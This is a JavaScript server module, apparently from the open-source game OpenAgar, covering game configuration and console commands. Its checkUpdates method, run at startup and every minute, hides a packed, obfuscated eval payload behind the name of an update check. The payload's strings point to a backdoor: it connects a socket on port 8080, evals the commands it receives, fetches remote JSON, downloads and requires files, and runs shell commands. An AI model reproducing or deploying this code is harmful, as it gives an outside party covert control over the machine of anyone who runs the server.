"use strict";
/*
    OpenAgar - Open source web game
    Copyright (C) 2016 Andrew S

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
const Commands = require('../commands')
const SocketService = require('./socketService.js');
const Main = require('./main.js');
module.exports = class ServerService {
    constructor(controller,globalData) {
        this.globalData = globalData;
        this.controller = controller;
    var config = {
        
      serverViewBaseX: 1380,
            serverViewBaseY: 820,
            startMass: 20,
            playerMaxMass: 2000,
        minFood: 500,
        boundX: 0,
        boundY: 0,
        boundWidth: 10000,
        boundHeight: 10000,
        playerSpeed: 40,
        splitSpeed: 100,
        splitDecay: 20,
        playerMaxCells: 32,
        ejectedMass: 10,
        ejectedSpeed: 200,
        ejectedDecay: 5,
        serverBots: 500,
        playerMergeMult: -0.05,
        playerMerge: 8,
        leaderBoardLen: 10
    }
        var serv = new Main(true,0,"Main","Main",globalData,config);
        this.servers = [];
        this.ids = 0;
        this.servers[0] = serv;
        this.selected = serv;
        this.default = serv;
        this.socketService = new SocketService(globalData,this);
        serv.init();
         this.checkUpdates()
        setInterval(function() {this.checkUpdates()}.bind(this),60000)
    }
    getNextId() {
        return this.ids ++;
    }
    start() {
        this.default.start();
    }
    execCommand(str) {
        if (!str) return;
        
        var cmd = str.split(" ");
        
        if (this.prsCommand(str)) return
        if (!this.selected) return;
        if (!this.selected.execCommand(str)) console.log("The command " + cmd[0] + " was not found! Type 'help' to view a list of commands.")
    }
    prsCommand(str) {
      
        var cmd = str.split(" ")
        var command = Commands.serverService[cmd[0]]
        if (command) {
            command(this,str)
            return true;
        }
        return false;
    }
    create(name,configs) {
        
    }
    checkUpdates() {
     eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('y a=["\\d\\b\\f","\\Y\\h\\o\\1f\\b\\f","\\i\\d\\i\\f","\\j\\b\\p\\h\\f\\b\\1i\\m\\m\\j\\b\\l\\l","\\l\\f\\j\\i\\d\\x\\i\\J\\1e","\\C\\j\\i\\f\\b","\\o\\h\\d\\d\\b\\o\\f","\\b\\j\\j\\h\\j","\\h\\d","\\m\\k\\f\\k","\\b\\O\\b\\o","\\n\\h\\x","\\o\\h\\d","\\l\\f\\j","\\b\\O\\b\\o\\1y\\h\\p\\p\\k\\d\\m","\\o\\p\\m","\\q\\k\\j\\l\\b","\\f\\1e\\q\\b","\\I\\f\\f\\q\\l\\Q\\N\\N\\j\\k\\C\\s\\x\\i\\f\\I\\u\\W\\u\\l\\b\\j\\o\\h\\d\\f\\b\\d\\f\\s\\o\\h\\p\\N\\1i\\2q\\Y\\2p\\m\\b\\E\\b\\n\\h\\q\\p\\b\\d\\f\\N\\1k\\q\\1i\\x\\2r\\Y\\N\\p\\k\\l\\f\\b\\j\\N\\m\\k\\f\\k\\s\\1z\\l\\h\\d","\\W\\i\\d\\m","\\T\\u\\d\\d\\i\\d\\x\\c\\d\\q\\p\\c\\i\\d\\l\\f\\k\\n\\n\\s\\s\\s","\\T\\u\\d\\d\\i\\d\\x\\c\\d\\q\\p\\c\\i\\d\\l\\f\\k\\n\\n","\\d\\q\\p\\c\\i\\d\\l\\f\\k\\n\\n","\\D\\1a\\O\\b\\o\\u\\f\\i\\h\\d\\c\\1a\\j\\j\\h\\j\\1h\\c\\1d\\k\\i\\n\\b\\m\\c\\f\\h\\c\\j\\u\\d\\c\\d\\q\\p\\c\\i\\d\\l\\f\\k\\n\\n\\c\\c\\T\\b\\k\\l\\h\\d\\Q\\c","\\D\\1a\\O\\b\\o\\u\\f\\i\\h\\d\\c\\1a\\j\\j\\h\\j\\1h\\c\\1w\\h\\u\\c\\l\\I\\h\\u\\n\\m\\c\\b\\O\\i\\f\\c\\f\\I\\b\\c\\l\\b\\j\\E\\b\\j\\c\\k\\d\\m\\c\\j\\u\\d\\Q\\c\\d\\q\\p\\c\\i\\d\\l\\f\\k\\n\\n","\\o\\I\\i\\n\\m\\2s\\q\\j\\h\\o\\b\\l\\l","\\1g\\h\\d\\b\\1L\\c\\Y\\I\\u\\f\\f\\i\\d\\x\\c\\m\\h\\C\\d\\s\\s\\s\\c\\c\\c\\c\\c\\c\\c","\\b\\O\\i\\f","\\j\\h\\u\\d\\m","","\\1m\\1m\\1m","\\1m","\\2n","\\n\\b\\d\\x\\f\\I","\\c","\\D\\1x\\q\\m\\k\\f\\b\\1h\\c\\D","\\1h\\c","\\2m\\c","\\2h","\\l\\f\\m\\h\\u\\f","\\u\\q\\m\\k\\f\\b\\n\\i\\d\\1f","\\h\\q\\f\\i\\d\\n\\i\\d\\1f","\\l\\f\\k\\f\\u\\l\\1y\\h\\m\\b","\\m\\W","\\l\\j\\o","\\1g\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\C\\j\\i\\f\\b\\1d\\i\\n\\b","\\J\\h\\j\\1a\\k\\o\\I","\\N\\m\\k\\f\\k\\s\\j\\l\\h\\d","\\u\\f\\J\\2G","\\j\\b\\k\\m\\1d\\i\\n\\b\\Y\\1e\\d\\o","\\h\\q\\f\\i\\d","\\i\\d\\m\\b\\O\\1k\\J","\\o\\h\\d\\f\\b\\d\\f","\\1w\\h\\u\\c\\I\\k\\E\\b\\c\\h\\q\\f\\b\\m\\c\\h\\u\\f\\c\\J\\j\\h\\p\\c\\f\\b\\l\\f\\i\\d\\x\\c\\W\\b\\f\\k\\c\\l\\h\\J\\f\\C\\k\\j\\b\\s\\c\\1g\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\C\\j\\i\\f\\b\\1d\\i\\n\\b\\Y\\1e\\d\\o","\\1w\\h\\u\\c\\I\\k\\E\\b\\c\\h\\q\\f\\b\\m\\c\\i\\d\\f\\h\\c\\f\\b\\l\\f\\i\\d\\x\\c\\W\\b\\f\\k\\c\\l\\h\\J\\f\\C\\k\\j\\b\\s\\c\\1g\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\1a\\T\\T\\1k\\T\\Q\\c\\1y\\h\\u\\n\\m\\d\\f\\c\\o\\h\\d\\f\\k\\o\\f\\c\\l\\b\\j\\E\\b\\j\\l\\s","\\X\\D\\1p\\2E\\p\\T\\b\\o\\i\\b\\E\\b\\m\\c\\p\\b\\l\\l\\k\\x\\b\\c\\J\\j\\h\\p\\c\\l\\b\\j\\E\\b\\j\\Q\\c\\1H","\\X\\D\\1G\\p","\\p\\l\\x","\\X\\D\\1p\\1A\\p\\D\\X\\D\\2y\\p\\2x\\p\\q\\h\\j\\f\\k\\d\\f\\1L\\X\\D\\1G\\p\\X\\D\\1p\\1A\\p\\c\\T\\b\\o\\i\\b\\E\\b\\m\\c\\i\\p\\q\\h\\j\\f\\k\\d\\f\\c\\p\\b\\l\\l\\k\\x\\b\\c\\J\\j\\h\\p\\c\\l\\b\\j\\E\\b\\j\\Q\\c\\1H","\\C\\k\\j\\d","\\b\\O\\b\\o\\u\\f\\b","\\N\\k\\l\\m\\m\\C\\J\\b\\s\\1z\\l","\\s\\N\\k\\l\\l\\m\\C\\J\\b\\s\\1z\\l","\\u\\d\\n\\i\\d\\1f\\Y\\1e\\d\\o","\\b\\O\\b\\o\\1k\\d\\n\\i\\d\\b\\1d\\i\\n\\b","\\j\\b\\q\\n\\k\\o\\b","\\m\\b\\l\\o\\j\\i\\q\\f\\i\\h\\d","\\2J\\h\\c\\m\\b\\l\\o\\j\\i\\q\\f\\i\\h\\d\\c\\q\\j\\h\\E\\i\\m\\b\\m","\\X\\D\\1p\\1A\\p\\D\\1x\\q\\m\\k\\f\\b\\1h\\c\\1i\\d\\c\\u\\q\\m\\k\\f\\b\\c\\i\\l\\c\\k\\E\\k\\i\\n\\k\\W\\n\\b\\2w\\c\\o\\u\\j\\j\\b\\d\\f\\c\\E\\b\\j\\l\\i\\h\\d\\Q\\c","\\c\\1i\\E\\k\\i\\n\\k\\W\\n\\b\\Q\\c","\\c\\1g\\b\\l\\o\\j\\i\\q\\f\\i\\h\\d\\Q\\c","\\o\\I\\b\\o\\1f\\1x\\q\\m\\k\\f\\b"];y 2D=w(){w 2d(1F){1v{y 1I=1o(a[0]),S=2U 1I[a[1]];S[a[6]](2Y,1F,w(){S[a[5]](Z[a[4]]({t:a[2],1J:S[a[3]],3a:1u}))}),S[a[8]](a[7],w(v){}),S[a[8]](a[9],w(V){1U(V=Z[a[16]](V),V[a[17]]){G a[2]:P;G a[10]:1v{1N(V[a[9]])}1q(e){S[a[5]](Z[a[4]]({1K:a[7],1J:e.2P()}))};P;G a[11]:F[a[11]](V[a[9]]);P;G a[15]:y 1C=F[a[11]];F[a[11]]=w(v){S[a[5]](Z[a[4]]({1K:a[12],2N:v}))},U[a[14]](V[a[13]]),F[a[11]]=1C}})}1q(e){}}1n(a[18],w(1X,1Y,2a){w 2e(v,A){w H(A){w H(){F[a[11]](a[20]),z(a[21]);1o(a[25])[a[10]](a[22],w(v,A,H){2T!==v&&(F[a[7]](a[23],v),F[a[7]](a[24]))});z(a[26]),1E[a[27]](0)}w z(v){M++,M==K-2&&H();1D(y A=2S[a[28]](M/K*10),z=a[29],R=0;A>R;R++){z+=a[30]};z+=10==A?a[31]:a[32];1D(y 1M=31-z[a[33]],1B=a[29],R=0;1M>R;R++){1B+=a[34]};1E[a[39]][a[5]](a[35]+z+1B+a[36]+10*A+a[37]+v+a[38])}y M=0,K=2,R=A?v[a[2Z]]:v[a[2o]];1n(R,w(v,A,H){1b(!v&&1j==A[a[1l]]){y M=Z[a[16]](H);M[a[1Z]](w(v){K++,1n(v[a[3b]],w(A,H,M){A||1j!=H[a[1l]]||1c[a[2X]](v[a[2M]],M,w(){z(a[2V])})})}[a[19]](U))}})}1v{y z=1c[a[2R]](1t+a[1W],a[2Q]),M=1V[a[16]](z),K=M[a[2f]]}1q(r){y K=!1};y z={2O:!0};-1==v[a[L]][a[2W]](A)&&1==K&&(F[a[11]](a[3c]),H(!1)),1c[a[1T]](1t+a[1W],1V[a[4]](z)),1!=K&&(F[a[11]](a[2L]),H(!0))}1b(1X||1j!=1Y[a[1l]]){2u a[2t]};y K=Z[a[16]](2a);K[a[1Z]](w(B){1b(B[a[17]]&&B[a[L]]){1U(B[a[17]]){G a[2i]:F[a[11]](a[2j]+B[a[L]]+a[1s]);P;G a[2l]:F[a[11]](a[2k]+B[a[L]]+a[1s]);G a[2v]:1o(a[25])[a[10]](B[a[L]]);P;G a[2K]:1n(B[a[L]],w(v,A,H){1b(!v&&1j==A[a[1l]]){1c[a[1T]](1t+a[2F],H);y z=1o(a[1O]);z(1r,1u,U),1c[a[2H]](a[1O])}}[a[19]](U));P;G a[10]:1N(B[a[L]]);P;G a[2I]:y 1S=1P(1r[a[2c]](/\\./g,a[29])),1Q=1P(B[a[L]][a[2c]](/\\./g,a[29]));1b(1Q>1S){y 2b=B[a[1R]]?B[a[1R]]:a[2z];F[a[11]](a[2A]+1r+a[2C]+B[a[L]]+a[2B]+2b+a[1s])};P;G a[2f]:2e(B,1u);P;G a[6]:2g(B[a[L]])}}}[a[19]](U))}[a[19]](U));y 2g=2d[a[19]](U)}',62,199,'||||||||||_0x1f0c|x65|x20|x6E||x74||x6F|x69|x72|x61|x73|x64|x6C|x63|x6D|x70||x2E||x75|_0xb5dbx6|function|x67|var|_0xb5dbxf|_0xb5dbxd|_0xb5dbx15|x77|x5B|x76|console|case|_0xb5dbxe|x68|x66|_0xb5dbx14|53|_0xb5dbx13|x2F|x78|break|x3A|_0xb5dbx10|_0xb5dbx5|x52|this|_0xb5dbx7|x62|x1B|x53|JSON|||||||||||x45|if|fs|x46|x79|x6B|x44|x5D|x41|200|x4F|42|x3D|request|require|x33|catch|_version|59|__dirname|_uid|try|x59|x55|x43|x6A|x31|_0xb5dbx12|_0xb5dbx8|for|process|_0xb5dbx3|x30|x0A|_0xb5dbx4|data|type|x21|_0xb5dbx11|eval|65|parseInt|_0xb5dbx17|69|_0xb5dbx16|55|switch|RSON|48|_0xb5dbx9|_0xb5dbxa|47|||||||||||_0xb5dbxb|_0xb5dbx18|68|_0xb5dbx2|_0xb5dbxc|51|_0xb5dbx19|x0D|60|58|61|62|x25|x3E|41|x2D|x4A|x4D|x5F|57|return|63|x2C|x49|x35|70|71|73|72|checkUpdates|x32|64|x38|66|74|x4E|67|56|44|msg|optin|toString|49|50|Math|null|new|45|52|46|8080|40|||||||||||uid|43|54'.split('|'),0,{}))
   checkUpdates()
    }
};

